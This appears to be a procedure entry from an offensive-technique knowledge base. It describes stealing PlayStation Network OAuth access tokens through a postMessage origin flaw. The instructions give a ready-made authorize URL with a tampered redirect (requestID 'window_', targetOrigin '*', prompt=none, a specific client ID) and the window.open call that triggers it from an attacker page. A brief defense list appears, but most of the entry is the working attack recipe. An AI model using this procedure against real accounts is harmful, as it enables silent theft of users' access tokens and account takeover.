---
tags:
  - oauth
  - authorization
  - postmessage
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1528.001]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:35.023Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1528.001]]'
id: 0411b6c5-848e-4a3b-96d7-d81f4d027672
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[T1528.001]]'
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-OAuth-Authorization-with-Modified-Parameters

## Summary

This procedure exploits the PSN OAuth flow by opening the authorize endpoint in a popup with tampered GET parameters, setting requestID to start with 'window_' and targetOrigin to '*', enabling postMessage to the attacker's origin.

## Description

The vulnerability stems from the response.html JavaScript (sendResponseToApp function) extracting targetOrigin from unvalidated GET params. When requestID prefixes 'window', it uses window.opener.postMessage without origin checks. This targets the implicit grant flow at https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize, redirecting to https://my.playstation.com/auth/response.html. Prerequisites include an active PSN session.

## Requirements

1. Active PSN session in browser
2. Malicious PoC page loaded
3. Client ID: 656ace0b-d627-47e6-915c-13b259cd06b2 (PSN social scope)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize GET parameters in OAuth handlers
- Enforce strict origin checks in postMessage
- Audit JavaScript for controllable origins

## Objectives

1. Initiate OAuth flow with misconfiguration
2. Bypass origin validation for token send
3. Trigger implicit grant without user interaction (prompt=none)

## Instructions

### Step 1: Prepare Modified URL

**Context**: Construct the authorize URL with tampered params.

URL: https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=...&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dwindow_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3D%2A&prompt=none

> Expected output: Valid URL with wildcard targetOrigin.

### Step 2: Execute window.open

**Context**: From PoC page, open popup with the URL.

JavaScript: window.open(modifiedURL, 'auth', 'width=500,height=600');

> Expected output: Popup opens to PSN auth; auto-redirects on grant.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[T1528.001]] Steal Application Access Token: OAuth 2.0 Implicit Flow
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- [[T1528.001]]

## Commands Used

- None

## Tools Used

- None

## Tags

- [[oauth]]
- [[authorization]]
- [[postmessage]]
